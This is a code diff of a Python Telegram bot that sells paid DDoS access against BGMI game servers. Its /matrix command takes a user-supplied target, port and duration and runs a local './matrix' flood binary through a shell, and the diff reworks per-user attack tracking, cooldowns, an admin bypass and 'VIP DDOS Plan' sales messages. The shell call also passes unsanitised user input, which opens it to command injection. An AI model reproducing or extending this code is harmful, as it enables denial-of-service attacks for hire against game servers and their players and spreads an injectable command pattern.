@@ -210,420 +210,211 @@ def show_user_id(message):
 #Store ongoing attacks globally
 ongoing_attacks = []
 
-# Store user attack tracking
-user_attacks = {}
-
-ongoing_attacks = {}  # Changed to dict to track per-user attacks
-
-class UserAttackState:
-    def __init__(self):
-        self.active_attacks = 0
-        self.cooldown_until = None
-
-    def can_attack(self):
-        current_time = datetime.now(IST)
-        
-        # If user is in cooldown, check if it's expired
-        if self.cooldown_until and current_time < self.cooldown_until:
-            return False, f"You are in cooldown. Wait until {self.cooldown_until.strftime('%H:%M:%S')}"
-        
-        # Check if user has reached attack limit
-        if self.active_attacks >= 2:
-            return False, "You already have 2 active attacks. Please wait for them to finish."
-        
-        return True, None
-
-    def start_attack(self):
-        self.active_attacks += 1
-        
-        # If this is the second attack, schedule the cooldown
-        if self.active_attacks >= 2:
-            self.schedule_cooldown()
-
-    def end_attack(self):
-        self.active_attacks = max(0, self.active_attacks - 1)
-        
-        # If all attacks are finished and cooldown was scheduled
-        if self.active_attacks == 0 and self.cooldown_until:
-            self.start_cooldown()
-
-    def schedule_cooldown(self):
-        # Schedule cooldown to start after attacks finish
-        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
-
-    def start_cooldown(self):
-        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
-        self.active_attacks = 0
-
-def execute_attack(message, user_id, attack_info, command):
-    try:
-        # Run attack command without capturing output - it will show in shell
-        subprocess.run(command, shell=True, capture_output=False, text=True)
-        
-        # Remove attack from ongoing list
-        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
-            ongoing_attacks[user_id].remove(attack_info)
-        
-        # Update user's attack state
-        if user_id in user_attacks:
-            user_attacks[user_id].end_attack()
-        
-        # Only send completion notification
-        bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King")
-    except Exception as e:
-        print(f"Error executing attack: {str(e)}")  # Print error to shell
-        # Ensure attack is removed from tracking on error
-        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
-            ongoing_attacks[user_id].remove(attack_info)
-        if user_id in user_attacks:
-            user_attacks[user_id].end_attack()
-
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    user_id = str(message.chat.id)
 
-    if user_id not in ongoing_attacks:
-        ongoing_attacks[user_id] = []
-
-    attack_info = {
+    # Track the ongoing attack
+    ongoing_attacks.append({
         'user': username,
         'target': target,
         'port': port,
         'time': time,
         'start_time': datetime.now(IST)
-    }
-    
-    ongoing_attacks[user_id].append(attack_info)
-
-    if user_id in user_attacks:
-        user_attacks[user_id].start_attack()
+    })
 
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
     full_command = f"./matrix {target} {port} {time}"
     try:
-        print(f"\nExecuting attack command: {full_command}")  # Print to shell
-        print(f"Attack started by user: {username} ({user_id})")  # Print to shell
+        print(f"Executing command: {full_command}")  # Log the command
+        result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
         
-        # Start attack in a separate thread
-        attack_thread = threading.Thread(target=execute_attack, args=(message, user_id, attack_info, full_command))
-        attack_thread.start()
+        # Remove attack from ongoing list once finished
+        ongoing_attacks.remove({
+            'user': username,
+            'target': target,
+            'port': port,
+            'time': time,
+            'start_time': ongoing_attacks[-1]['start_time']
+        })
         
-    except Exception as e:
-        print(f"Error starting attack: {str(e)}")  # Print to shell
-        # Clean up attack record on error
-        ongoing_attacks[user_id].remove(attack_info)
-        user_attacks[user_id].end_attack()
-
-@bot.message_handler(commands=['matrix'])
-def handle_matrix(message):
-    remove_expired_users()
-    user_id = str(message.chat.id)
-    
-    users = read_users()
-    command = message.text.split()
-    
-    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"
-
-    if user_id in admin_owner or user_id in users:
-        if user_id in admin_owner:
-            # Admin owner can bypass attack limits and cooldown
-            if len(command) == 4:
-                try:
-                    target = command[1]
-                    port = int(command[2])
-                    time = int(command[3])
-
-                    if time > 180:
-                        response = "Error: Time interval must be 180 seconds or less"
-                    else:
-                        start_attack_reply(message, target, port, time)
-                        return
-                except ValueError:
-                    response = "Error: Please ensure port and time are integers."
-            else:
-                response = "Usage: /matrix <target> <port> <time>"
+        if result.returncode == 0:
+            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
         else:
-            # Initialize attack state for user if not exists
-            if user_id not in user_attacks:
-                user_attacks[user_id] = UserAttackState()
-            
-            # Check if user can attack
-            can_attack, error_message = user_attacks[user_id].can_attack()
-            
-            if can_attack:
-                if len(command) == 4:
-                    try:
-                        target = command[1]
-                        port = int(command[2])
-                        time = int(command[3])
+            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
+    except Exception as e:
+        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")
 
-                        if time > 180:
-                            response = "Error: Time interval must be 180 seconds or less"
-                        else:
-                            start_attack_reply(message, target, port, time)
-                            return
-                    except ValueError:
-                        response = "Error: Please ensure port and time are integers."
-                else:
-                    response = "Usage: /matrix <target> <port> <time>"
-            else:
-                response = error_message
-
-    bot.reply_to(message, response)
-
+        
 @bot.message_handler(commands=['status'])
 def show_status(message):
     user_id = str(message.chat.id)
     if user_id in admin_owner or user_id in read_users():
         response = "Ongoing Attacks:\n\n"
-        
-        total_attacks = 0
-        for user_id, attacks in ongoing_attacks.items():
-            if attacks:
-                total_attacks += len(attacks)
-                for attack in attacks:
-                    response += (f"User: {attack['user']}\nTarget: {attack['target']}\n"
-                               f"Port: {attack['port']}\nTime: {attack['time']} seconds\n"
-                               f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-        
-        if total_attacks == 0:
+        if ongoing_attacks:
+            for attack in ongoing_attacks:
+                response += (f"User: {attack['user']}\nTarget: {attack['target']}\nPort: {attack['port']}\n"
+                             f"Time: {attack['time']} seconds\n"
+                             f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+        else:
             response += "No ongoing attacks currently."
-        
+
         bot.reply_to(message, response)
     else:
         bot.reply_to(message, "You are not authorized to view the status.")
+        
+# Global dictionary to track cooldown times for users
+bgmi_cooldown = {}
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
+@bot.message_handler(commands=['matrix'])
+def handle_matrix(message):
+    remove_expired_users()  # Check for expired users
     user_id = str(message.chat.id)
-    users = read_users()
-    user_name = message.from_user.first_name
     
-    if user_id in admin_owner or user_id in users:
-        response = f"""Welcome to Our BOT, {user_name}
-🔰 Run This Command : /help
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 BUY / OWNER - @its_MATRIX_King
+    users = read_users()
+    command = message.text.split()
+    
+    # Initialize response to a default value
+    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"
 
-✅ You are an authorized user with full access."""
-    else:
-        response = f"""⚠️ Unauthorized Access!
+    # Check if the user has any ongoing attacks
+    if ongoing_attacks:
+        response = "An attack is currently in progress. Please wait until it completes before starting a new one."
+    elif user_id in admin_owner or user_id in users:
+        if user_id in admin_owner:
+            # Admin owner can bypass cooldown
+            if len(command) == 4:  # Ensure proper command format (no threads argument)
+                try:
+                    target = command[1]
+                    port = int(command[2])  # Convert port to integer
+                    time = int(command[3])  # Convert time to integer
 
-Dear {user_name},
-You are not authorized to use this bot.
+                    if time > 180:
+                        response = "Error: Time interval must be 180 seconds or less"
+                    else:
+                        # Start the attack without setting a cooldown for admin owners
+                        start_attack_reply(message, target, port, time)
+                        return  # Early return since response is handled in start_attack_reply
+                except ValueError:
+                    response = "Error: Please ensure port and time are integers."
+            else:
+                response = "Usage: /matrix <target> <port> <time>"
+        else:
+            # Non-admin users, check if they are within the cooldown period
+            if user_id in bgmi_cooldown:
+                cooldown_expiration = bgmi_cooldown[user_id]
+                current_time = datetime.now(pytz.timezone('Asia/Kolkata'))  # Get current time in IST
+                if current_time < cooldown_expiration:
+                    time_left = (cooldown_expiration - current_time).seconds
+                    response = f"You need to wait {time_left} seconds before using the /matrix command again."
+                else:
+                    # Cooldown has expired, proceed with the command
+                    if len(command) == 4:  # Ensure proper command format (no threads argument)
+                        try:
+                            target = command[1]
+                            port = int(command[2])  # Convert port to integer
+                            time = int(command[3])  # Convert time to integer
 
-         /"\
-        |\./|
-        |   |
-        |   |
-        |>*<|
-        |   |
-     /'\|   |/'\
- /'\|   |   |   |
-|   |   |   |   |\
-|   |   |   |   |  \
-| *   *   *   * |>  >  We are Watching you
-|                  /
- |               /
-  |            /
-   \          |
-    |         |
-Please contact @its_MATRIX_King to purchase access.
+                            if time > 180:
+                                response = "Error: Time interval must be 180 seconds or less"
+                            else:
+                                # Start the attack and set the new cooldown
+                                start_attack_reply(message, target, port, time)
+                                bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
+                                return  # Early return since response is handled in start_attack_reply
+                        except ValueError:
+                            response = "Error: Please ensure port and time are integers."
+                    else:
+                        response = "Usage: /matrix <target> <port> <time>"
+            else:
+                # User not in cooldown, proceed with the command
+                if len(command) == 4:  # Ensure proper command format (no threads argument)
+                    try:
+                        target = command[1]
+                        port = int(command[2])  # Convert port to integer
+                        time = int(command[3])  # Convert time to integer
 
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
+                        if time > 180:
+                            response = "Error: Time interval must be 180 seconds or less"
+                        else:
+                            # Start the attack and set the new cooldown
+                            start_attack_reply(message, target, port, time)
+                            bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
+                            return  # Early return since response is handled in start_attack_reply
+                    except ValueError:
+                        response = "Error: Please ensure port and time are integers."
+                else:
+                    response = "Usage: /matrix <target> <port> <time>"
 
     bot.reply_to(message, response)
+
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
     try:
         user_id = str(message.chat.id)
-        users = read_users()
 
-        if user_id in admin_owner or user_id in users:
-            # Help text for authorized users
-            if user_id in admin_owner:
-                help_text = '''✅ ADMIN COMMANDS:
+        # Basic help text for all users
+        help_text = '''Available Commands:
+    - /matrix : Execute a BGMI server attack (specific conditions apply).
+    - /rulesanduse : View usage rules and important guidelines.
+    - /plan : Check available plans and pricing for the bot.
+    - /status : View ongoing attack details.
+    - /id : Retrieve your user ID.
+    '''
 
-🔰 /matrix - Execute BGMI server attack
-🔰 /status - View ongoing attack details
-🔰 /add - Add new user with time limit
-🔰 /remove - Remove user access
-🔰 /allusers - List all authorized users
-🔰 /broadcast - Send message to all users
-🔰 /rulesanduse - View usage guidelines
-🔰 /plan - Check available plans
-🔰 /id - Get your user ID
+        # Check if the user is an admin and append admin commands
+        if user_id in admin_id:
+            help_text += '''
+Admin Commands:
+    - /add <user_id> <time_in_minutes> : Add a user with specified time.
+    - /remove <user_id> : Remove a user from the authorized list.
+    - /allusers : List all authorized users.
+    - /broadcast : Send a broadcast message to all users.
+    '''
 
+        # Footer with channel and owner information
+        help_text += ''' 
 JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
-            else:
-                help_text = '''✅ USER COMMANDS:
+BUY / OWNER - @its_MATRIX_King
+'''
 
-🔰 /matrix - Execute BGMI server attack
-🔰 /status - View ongoing attack details
-🔰 /rulesanduse - View usage guidelines
-🔰 /plan - Check available plans
-🔰 /id - Get your user ID
-
-JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
-        else:
-            help_text = """⚠️ Unauthorized Access!
-
-Dear {user_name},
-You are not authorized to use this bot.
-         /"\
-        |\./|
-        |   |
-        |   |
-        |>*<|
-        |   |
-     /'\|   |/'\
- /'\|   |   |   |
-|   |   |   |   |\
-|   |   |   |   |  \
-| *   *   *   * |>  >  We are Watching you
-|                  /
- |               /
-  |            /
-   \          |
-    |         |
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
-
+        # Send the constructed help text to the user
         bot.reply_to(message, help_text)
     
     except Exception as e:
         logging.error(f"Error in /help command: {e}")
-        bot.reply_to(message, "An error occurred while processing your request.")
+        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
+    
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRIX_CHEATS\nBUY / OWNER - @its_MATRIX_King "
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rulesanduse'])
 def welcome_rules(message):
-    user_id = str(message.chat.id)
-    users = read_users()
     user_name = message.from_user.first_name
-    
-    if user_id in admin_owner or user_id in users:
-        response = f'''✅ Rules & Usage Guidelines for {user_name}:
+    response = f'''{user_name} Please Follow These Rules:
 
-⚠️ IMPORTANT RULES:
-1. Maximum attack time is 180 seconds
-2. Use Multiple Attacks Like 180+180
-3. Before First 120 Seconds Attack Use Another Attack
-4. Do not abuse the service
-
-🔰 USAGE TIPS:
-• Use correct port numbers
-• Verify target before attack
-• Follow cooldown periods
-• Report any issues to admin
-
+1. Time Should Be 180 or Below
+2. Click /status Before Entering Match
+3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
 JOIN CHANNEL - @MATRIX_CHEATS
-OWNER - @its_MATRIX_King'''
-    else:
-        response = f"""⚠️ Unauthorized Access!
-
-Dear {user_name},
-You are not authorized to use this bot.
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣀⣤⣤⣄⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣴⣿⣿⣿⣿⣿⣿⣦⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢀⣾⣿⣿⠟⣻⣿⣿⡟⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣼⣿⣿⣿⣿⣼⡻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣌⢻⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢸⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣤⣀⠀⠀⠠⣶⡶⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠈⢿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣯⣿⣿⣶⣴⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠉⠉⣿⣯⣝⣋⡛⠟⠿⠿⠿⠿⠿⣿⡿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢃⣤⣴⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠘⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡄⠀⠈⠛⠿⠿⠿⠿⠟⠋⠁⢐⣿⣿⣟⣻⣿⣟⢿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠈⣿⣿⣿⣷⣬⣍⣛⣛⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣘⣿⣿⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣭⣿⣷⡀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣩⣿⣿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠘⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⣭⣝⡛⠿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣶⣾⣿⡍⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 Run /plan For Our Details
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 Owner - @its_MATRIX_King"""
+BUY / OWNER - @its_MATRIX_King '''
+   
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''💰 VIP PLANS & PRICING
-
-Dear {user_name},
-Contact @its_MATRIX_King for current plans and pricing.
-
-✨ BENEFITS:
-• Premium Support
-• 24*7 Running
-• Priority Access
-• Extended Features
-• Reliable Service
-
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 OWNER - @its_MATRIX_King'''
-    
+    response = f'''{user_name}, 
+    Purchase VIP DDOS Plan From @its_Matrix_King
+    Join Channel @MATRIX_CHEATS
+'''
     bot.reply_to(message, response)
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
-    response = f'''🆔 USER IDENTIFICATION
-
-Your Telegram ID: {user_id}
-
-Use this ID when purchasing access.
-Contact @its_MATRIX_King for activation.'''
-    
-    bot.reply_to(message, response)
-
-def check_authorization(user_id):
-    """Helper function to check if user is authorized"""
-    users = read_users()
-    return user_id in admin_owner or user_id in users
-
-def unauthorized_message(user_name):
-    """Helper function to generate unauthorized message"""
-    return f'''⚠️ Unauthorized Access!
-
-Dear {user_name},
-You do not have permission to use this command.
-Please contact @its_MATRIX_King to purchase access.
-
-🔰 JOIN CHANNEL - @MATRIX_CHEATS
-🔰 OWNER - @its_MATRIX_King'''
 
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
@@ -657,8 +448,8 @@ def broadcast_message(message):
     if user_id in admin_owner:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "Message To All Users By MATRIX:\n\n" + command[1]
-            users = read_users() 
+            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
+            users = read_users()  # Get users from Redis
             if users:
                 for user in users:
                     try:
